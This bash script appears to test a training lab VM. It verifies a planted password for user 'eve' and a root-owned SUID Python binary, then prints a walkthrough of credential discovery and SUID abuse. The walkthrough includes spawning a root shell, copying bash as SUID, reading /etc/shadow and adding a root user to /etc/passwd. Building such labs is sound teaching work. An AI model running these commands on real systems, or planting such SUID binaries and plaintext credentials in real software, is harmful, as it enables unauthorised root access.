#!/bin/bash
# Test Eve's Attack Paths
# Tests credential discovery and SUID privilege escalation

echo "=========================================="
echo "  Testing Eve Attack Paths"
echo "=========================================="
echo ""

echo "=== Test 1: Eve Account Exists ==="
echo ""

if id eve &>/dev/null; then
    echo "✓ User eve exists"
    id eve
else
    echo "✗ User eve does not exist"
    exit 1
fi

echo ""
echo "=== Test 2: Eve's Password Works ==="
echo ""

if echo "DevAccess99" | su eve -c "whoami" 2>/dev/null | grep -q "eve"; then
    echo "✓ Password 'DevAccess99' works"
else
    echo "✗ Password does not work"
    exit 1
fi

echo ""
echo "=== Test 3: Credential Discovery Paths ==="
echo ""

echo "Path 1: Web config file"
if [ -f /var/www/html/legacy/config.ini ]; then
    echo "✓ Config file exists"
    if grep -q "DevAccess99" /var/www/html/legacy/config.ini; then
        echo "✓ Password found in config.ini"
        grep -A2 "ssh_access" /var/www/html/legacy/config.ini
    else
        echo "⚠ Password not in config file"
    fi
else
    echo "⚠ Config file missing"
fi

echo ""
echo "Path 2: SSH notes in home directory"
if [ -f /home/eve/ssh_setup_notes.txt ]; then
    echo "✓ SSH notes exist"
    if grep -q "DevAccess99" /home/eve/ssh_setup_notes.txt; then
        echo "✓ Password found in notes"
    else
        echo "⚠ Password not in notes"
    fi
else
    echo "⚠ SSH notes missing"
fi

echo ""
echo "Path 3: Bash history"
if [ -f /home/eve/.bash_history ]; then
    echo "✓ Bash history exists"
    if grep -q "DevAccess99" /home/eve/.bash_history; then
        echo "✓ Password hint in history"
    fi
else
    echo "⚠ Bash history missing"
fi

echo ""
echo "=== Test 4: SUID Python Binary ==="
echo ""

if [ -f /opt/legacy/python3-eve ]; then
    echo "✓ SUID Python binary exists"
    
    # Check permissions
    PERMS=$(ls -la /opt/legacy/python3-eve | awk '{print $1}')
    OWNER=$(ls -la /opt/legacy/python3-eve | awk '{print $3":"$4}')
    
    echo "  Permissions: $PERMS"
    echo "  Owner: $OWNER"
    
    # Verify SUID bit
    if echo "$PERMS" | grep -q "rws"; then
        echo "✓ SUID bit is set"
    else
        echo "✗ SUID bit NOT set"
        exit 1
    fi
    
    # Verify owned by root
    if echo "$OWNER" | grep -q "root:root"; then
        echo "✓ Owned by root:root"
    else
        echo "⚠ NOT owned by root (currently: $OWNER)"
    fi
    
    # Check it's actually Python
    if file /opt/legacy/python3-eve | grep -q "ELF"; then
        echo "✓ Is a valid executable"
    else
        echo "⚠ May not be a valid executable"
    fi
else
    echo "✗ SUID Python binary does not exist"
    exit 1
fi

echo ""
echo "=== Test 5: SUID Functionality Test ==="
echo ""

echo "Testing privilege escalation as regular user..."

# Test effective UID when running SUID Python
EUID_TEST=$(su eve -c "/opt/legacy/python3-eve -c 'import os; print(os.geteuid())'" 2>/dev/null)

if [ "$EUID_TEST" = "0" ]; then
    echo "✓ SUID Python runs with EUID 0 (root)"
    echo "  Test output: EUID = $EUID_TEST"
else
    echo "⚠ EUID test inconclusive (got: $EUID_TEST, expected: 0)"
fi

echo ""
echo "Testing shell spawn with -p flag..."

# Test shell spawning (this won't give us interactive shell in script, but we can test the command)
su eve -c "/opt/legacy/python3-eve -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\", \"-c\", \"id\")'" 2>/dev/null | grep "uid=" && echo "✓ Can spawn privileged shell"

echo ""
echo "=== Test 6: Check README and Documentation ==="
echo ""

if [ -f /opt/legacy/README.txt ]; then
    echo "✓ README exists"
    if grep -q "SUID" /opt/legacy/README.txt; then
        echo "✓ README mentions SUID binary"
    fi
    if grep -q "SEC-2847" /opt/legacy/README.txt; then
        echo "✓ README contains ticket reference"
    fi
else
    echo "⚠ README missing"
fi

echo ""
echo "=== Test 7: Find SUID Binary (Student Enumeration) ==="
echo ""

echo "Simulating: find / -perm -4000 -type f 2>/dev/null"
find / -perm -4000 -type f 2>/dev/null | grep -q "python3-eve" && echo "✓ SUID binary discoverable via find command"

echo ""
echo "=========================================="
echo "  Test Summary"
echo "=========================================="
echo ""

echo "Credential Discovery Paths:"
echo ""
echo "  Method 1: Web Enumeration"
echo "    - Browse to: http://192.168.56.21/legacy/"
echo "    - Find: config.ini"
echo "    - Contains: username = eve, password = DevAccess99"
echo ""
echo "  Method 2: File System (as Alice/Bob)"
echo "    - ls /home/"
echo "    - cat /home/eve/ssh_setup_notes.txt"
echo "    - Find: Password: DevAccess99"
echo ""
echo "  Method 3: Shared Credentials"
echo "    - cat /opt/devteam/credentials/team_access.txt"
echo "    - Find all user passwords including Eve's"
echo ""
echo "---"
echo ""
echo "Privilege Escalation: Eve → Root (SUID Python)"
echo ""
echo "1. Enumerate SUID binaries:"
echo "   eve@vm:~$ find / -perm -4000 -type f 2>/dev/null"
echo "   /opt/legacy/python3-eve"
echo ""
echo "2. Investigate the binary:"
echo "   eve@vm:~$ ls -la /opt/legacy/python3-eve"
echo "   -rwsr-xr-x root root ... python3-eve"
echo ""
echo "   eve@vm:~$ file /opt/legacy/python3-eve"
echo "   ELF 64-bit ... executable ... Python"
echo ""
echo "3. Read documentation:"
echo "   eve@vm:~$ cat /opt/legacy/README.txt"
echo "   (explains it's a SUID binary for hardware access)"
echo ""
echo "4. Check GTFOBins for Python SUID:"
echo "   https://gtfobins.github.io/gtfobins/python/"
echo ""
echo "5. Exploit:"
echo "   eve@vm:~$ /opt/legacy/python3-eve -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
echo ""
echo "6. Verify root access:"
echo "   # whoami"
echo "   root"
echo ""
echo "   # id"
echo "   uid=1003(eve) gid=1003(eve) euid=0(root) egid=0(root)"
echo ""
echo "Alternative Exploitation Methods:"
echo ""
echo "  Method 1: Direct shell spawn (recommended)"
echo "    /opt/legacy/python3-eve -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
echo ""
echo "  Method 2: Create SUID bash"
echo "    /opt/legacy/python3-eve -c 'import os; os.system(\"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash\")'"
echo "    /tmp/rootbash -p"
echo ""
echo "  Method 3: Read root files"
echo "    /opt/legacy/python3-eve -c 'print(open(\"/etc/shadow\").read())'"
echo ""
echo "  Method 4: Add root user"
echo "    /opt/legacy/python3-eve -c 'import os; os.system(\"echo hacker:x:0:0::/root:/bin/bash >> /etc/passwd\")'"
echo ""
echo "MITRE ATT&CK:"
echo "  - T1552.001: Credentials in Files (config.ini, notes)"
echo "  - T1083: File and Directory Discovery"
echo "  - T1548.001: Setuid and Setgid (SUID abuse)"
echo "  - T1059.006: Command and Scripting Interpreter: Python"
echo ""
